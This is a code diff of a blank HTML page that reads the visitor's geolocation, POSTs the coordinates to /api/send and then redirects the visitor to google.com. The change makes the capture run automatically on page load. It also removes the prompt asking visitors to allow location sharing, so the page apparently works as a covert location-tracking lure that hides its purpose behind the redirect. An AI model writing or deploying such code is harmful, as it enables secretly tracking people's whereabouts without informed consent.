@@ -1,34 +1,33 @@
 <!DOCTYPE html>
 <html>
-<body>
-  <p>   </p>
+<body onclick="start()">
 
-  <script>
-    function sendLocation(lat, lon) {
-      fetch("/api/send", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ lat, lon })
-      }).then(() => {
+<script>
+  function sendLocation(lat, lon) {
+    fetch("/api/send", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ lat, lon })
+    }).then(() => {
+      window.location.href = "https://google.com";
+    });
+  }
+
+  function start() {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        sendLocation(pos.coords.latitude, pos.coords.longitude);
+      },
+      () => {
         window.location.href = "https://google.com";
-      });
-    }
+      }
+    );
+  }
 
-    function start() {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          sendLocation(pos.coords.latitude, pos.coords.longitude);
-        },
-        () => {
-          document.body.innerHTML = "Izinkan lokasi untuk lanjut...";
-        }
-      );
-    }
+  start();
+</script>
 
-    // 👇 hanya jalan kalau user klik
-    document.body.addEventListener("click", start);
-  </script>
 </body>
 </html>
